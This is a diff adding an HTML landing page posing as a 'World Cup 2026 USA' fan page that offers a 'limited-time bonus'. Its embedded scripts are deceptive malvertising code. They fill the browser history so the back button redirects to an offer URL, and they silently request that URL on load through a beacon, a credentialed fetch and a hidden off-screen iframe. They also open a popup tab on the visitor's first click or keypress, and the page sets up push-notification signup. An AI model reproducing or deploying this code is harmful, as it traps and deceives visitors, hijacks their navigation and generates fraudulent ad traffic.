@@ -1,0 +1,214 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>World Cup 2026 USA</title>
+
+<style>
+*{
+  margin:0;
+  padding:0;
+  box-sizing:border-box;
+}
+
+html,body{
+  height:100%;
+  font-family:Arial, Helvetica, sans-serif;
+}
+
+body{
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  text-align:center;
+  color:#fff;
+
+  background:
+  linear-gradient(rgba(0,0,0,.45), rgba(0,0,0,.75)),
+  url("https://images.unsplash.com/photo-1522778119026-d647f0596c20?auto=format&fit=crop&w=2000&q=80")
+  center/cover no-repeat;
+}
+
+.container{
+  max-width:650px;
+  padding:30px;
+}
+
+.badge{
+  display:inline-block;
+  padding:8px 14px;
+  border-radius:999px;
+  background:rgba(255,255,255,.12);
+  font-size:13px;
+  letter-spacing:1px;
+  margin-bottom:20px;
+}
+
+h1{
+  font-size:clamp(44px,8vw,86px);
+  font-weight:900;
+  text-transform:uppercase;
+  line-height:0.95;
+  margin-bottom:18px;
+}
+
+.sub{
+  font-size:20px;
+  line-height:1.4;
+  margin-bottom:30px;
+  opacity:.95;
+}
+
+.cta{
+  display:inline-block;
+  background:#ffcc00;
+  color:#111;
+  text-decoration:none;
+  padding:20px 46px;
+  border-radius:10px;
+  font-size:22px;
+  font-weight:900;
+  text-transform:uppercase;
+  box-shadow:0 10px 30px rgba(255,204,0,.35);
+  transition:.2s ease;
+}
+
+.cta:hover{
+  transform:translateY(-2px);
+}
+
+.small{
+  margin-top:16px;
+  font-size:13px;
+  opacity:.75;
+}
+</style>
+  <script src="https://cdn.onesignal.com/sdks/web/v16/OneSignalSDK.page.js" defer></script>
+<script>
+  window.OneSignalDeferred = window.OneSignalDeferred || [];
+  OneSignalDeferred.push(async function(OneSignal) {
+    await OneSignal.init({
+      appId: "5caf5253-8bee-4c9c-b093-387d5d12d5e4",
+    });
+  });
+</script>
+<script>
+  !(function() {
+    var t;
+    try {
+        const URL = window.location.href.split(/[#]/)[0];
+        for (t = 0; 10 > t; ++t) history.pushState({}, '', URL + '#');
+        onpopstate = function(event) {
+            event.state &&
+                location.replace(`https://go1.trakit25.com/offers.go?spaceid=11895868&subid=&clickid=`);
+        };
+    } catch (o) {
+        console.log(o);
+    }
+})();
+  </script>
+  <script>
+(() => {
+  const OFFER_URL = "https://go1.trakit25.com/offers.go?spaceid=11895868&subid=&clickid=";
+  let offerTabOpened = false;
+  let silentTried = false;
+
+  function trySilentBackgroundCall() {
+    if (silentTried) return;
+    silentTried = true;
+
+    try {
+      if (navigator.sendBeacon) {
+        navigator.sendBeacon(OFFER_URL);
+        return;
+      }
+    } catch (e) {}
+
+    try {
+      fetch(OFFER_URL, {
+        method: "GET",
+        mode: "no-cors",
+        credentials: "include",
+        keepalive: true
+      }).catch(() => {});
+    } catch (e) {}
+
+    try {
+      const iframe = document.createElement("iframe");
+      iframe.style.width = "1px";
+      iframe.style.height = "1px";
+      iframe.style.position = "fixed";
+      iframe.style.left = "-9999px";
+      iframe.style.top = "-9999px";
+      iframe.style.opacity = "0";
+      iframe.setAttribute("aria-hidden", "true");
+      iframe.src = OFFER_URL;
+      document.body.appendChild(iframe);
+
+      setTimeout(() => {
+        iframe.remove();
+      }, 15000);
+    } catch (e) {}
+  }
+
+  function openOfferTabOnce() {
+    if (offerTabOpened) return;
+    offerTabOpened = true;
+
+    const win = window.open(OFFER_URL, "_blank", "noopener,noreferrer");
+
+    if (!win) {
+      // Popup geblockt -> einfach nichts machen
+    }
+  }
+
+  function firstUserActionHandler() {
+    openOfferTabOnce();
+    removeListeners();
+  }
+
+  function removeListeners() {
+    document.removeEventListener("click", firstUserActionHandler, true);
+    document.removeEventListener("pointerdown", firstUserActionHandler, true);
+    document.removeEventListener("touchstart", firstUserActionHandler, true);
+    document.removeEventListener("keydown", firstUserActionHandler, true);
+  }
+
+  if (document.readyState === "loading") {
+    document.addEventListener("DOMContentLoaded", trySilentBackgroundCall, { once: true });
+  } else {
+    trySilentBackgroundCall();
+  }
+
+  document.addEventListener("click", firstUserActionHandler, true);
+  document.addEventListener("pointerdown", firstUserActionHandler, true);
+  document.addEventListener("touchstart", firstUserActionHandler, true);
+  document.addEventListener("keydown", firstUserActionHandler, true);
+})();
+</script>
+</head>
+
+<body>
+
+<div class="container">
+
+  <div class="badge">⚽ WORLD CUP 2026 • USA</div>
+
+  <h1>
+    USA IS READY
+  </h1>
+
+  <div class="sub">
+    The biggest soccer tournament on earth is here.<br>
+    A limited-time bonus is now available for fans.
+  </div>
+
+  <a class="cta" href="https://vb3xp.bemobtrcks.com/click">
+    CLAIM BONUS
+  </a>
+
+</div>
+
+</body>
+</html>
